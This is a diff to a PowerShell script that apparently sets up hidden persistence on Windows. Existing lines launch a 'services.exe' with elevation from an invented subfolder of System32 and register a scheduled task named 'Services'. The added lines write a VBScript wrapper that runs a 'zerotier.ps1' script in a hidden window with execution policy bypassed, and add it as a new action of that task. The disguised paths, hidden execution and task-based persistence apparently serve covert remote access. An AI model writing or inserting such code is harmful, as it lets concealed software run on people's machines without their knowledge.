@@ -149,19 +149,37 @@ Clone-GitHubRepo
 #Starting programs
 Start-Process -FilePath "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe" -Verb RunAs
 
-
 # Define variables
 $taskName = "Services"
 $xmlFilePath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\sch.xml"
+$psScriptPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\zerotier.ps1"
+$vbScriptPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\run_zerotier.vbs"
 
 # Retrieve current user and domain information dynamically
 $domain = $env:USERDOMAIN
 $username = $env:USERNAME
 
-# Ensure the directory exists before saving the file
+# Ensure the directory exists before saving the files
 $xmlDirectory = Split-Path -Path $xmlFilePath -Parent
 if (!(Test-Path -Path $xmlDirectory)) {
     New-Item -ItemType Directory -Path $xmlDirectory -Force | Out-Null
+}
+
+# Create a VBScript wrapper to launch the PowerShell script hidden
+$vbScriptContent = @"
+Dim shell
+Set shell = CreateObject("WScript.Shell")
+shell.Run "powershell.exe -ExecutionPolicy Bypass -File `"$psScriptPath`"", 0, False
+Set shell = Nothing
+"@
+
+# Save the VBScript file
+Try {
+    $vbScriptContent | Out-File -FilePath $vbScriptPath -Encoding ASCII -Force
+    Write-Output "VBScript wrapper created successfully: $vbScriptPath"
+} Catch {
+    Write-Error "Failed to create VBScript file: $_"
+    Exit 1
 }
 
 # Define the XML content dynamically
@@ -226,6 +244,10 @@ $xmlContent = @"
     </Exec>
     <Exec>
       <Command>"C:\Program Files\SubDir\services.exe"</Command>
+    </Exec>
+    <Exec>
+      <Command>wscript.exe</Command>
+      <Arguments>"$vbScriptPath"</Arguments>
     </Exec>
   </Actions>
 </Task>
